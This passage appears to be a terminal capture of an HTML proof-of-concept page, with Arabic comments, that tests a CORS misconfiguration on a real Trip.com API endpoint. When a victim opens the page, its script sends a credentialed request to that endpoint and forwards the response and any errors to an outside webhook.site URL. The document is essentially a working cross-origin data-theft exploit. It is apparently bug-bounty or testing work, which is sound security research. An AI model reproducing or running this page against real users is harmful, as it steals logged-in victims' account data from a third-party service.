@@ -1,0 +1,109 @@
+]
+└─# cat index.html 
+k<!DOCTYPE html>
+<html>
+<body>
+
+<h1>CORS Test</h1>
+
+<pre id="result"></pre>
+
+<script>
+
+// ===== رابط webhook.site لإرسال الرد إليه =====
+const TARGET_URL = "https://webhook.site/2bef5d8a-4a84-4ab7-8e71-ef2f512aa556";
+
+// ===== الطلب إلى Trip.com =====
+fetch("https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        head:{
+            locale:"ar-XX",
+            currency:"USD",
+            vID:"1783978788105.8e68P1hvGdSY"
+        },
+        platform:"Online",
+        componentType:"online-app-download-universal",
+        version:"6.0.5",
+        pageId:"10320668148",
+        aid:0,
+        sid:0,
+        customId:"side",
+        customParam:{}
+    })
+})
+
+// ===== معالجة الرد من Trip.com =====
+.then(async r => {
+    // قراءة الرد
+    const status = r.status;
+    const responseText = await r.text();
+    
+    // عرض النتيجة في الصفحة (نفس الشيء)
+    document.getElementById("result").textContent =
+    "Status: " + status + "\n\n" + responseText;
+    
+    // ===== إرسال الرد إلى webhook.site =====
+    try {
+        const forwardResponse = await fetch(TARGET_URL, {
+            method: "POST",
+            mode: 'no-cors',  // لتجنب مشاكل CORS
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                source: "trip.com",
+                status: status,
+                response: responseText,
+                timestamp: new Date().toISOString(),
+                url: window.location.href
+            })
+        });
+        
+        console.log("✅ تم إرسال الرد إلى webhook.site");
+        
+        // إضافة تأكيد في الصفحة
+        document.getElementById("result").textContent += 
+        "\n\n✅ تم إرسال البيانات إلى webhook.site";
+        
+    } catch(forwardError) {
+        console.error("❌ فشل إرسال الرد:", forwardError);
+        document.getElementById("result").textContent += 
+        "\n\n❌ فشل إرسال البيانات إلى webhook.site";
+    }
+})
+
+// ===== معالجة الأخطاء =====
+.catch(e => {
+    document.getElementById("result").textContent =
+    "Blocked:\n" + e;
+    
+    // حتى الخطأ نرسله إلى webhook.site
+    try {
+        fetch(TARGET_URL, {
+            method: "POST",
+            mode: 'no-cors',
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                source: "trip.com",
+                error: e.toString(),
+                timestamp: new Date().toISOString()
+            })
+        });
+        console.log("✅ تم إرسال الخطأ إلى webhook.site");
+    } catch(forwardError) {
+        console.error("❌ فشل إرسال الخطأ:", forwardError);
+    }
+});
+
+</script>
+
+</body>
+</html>
+                                                      
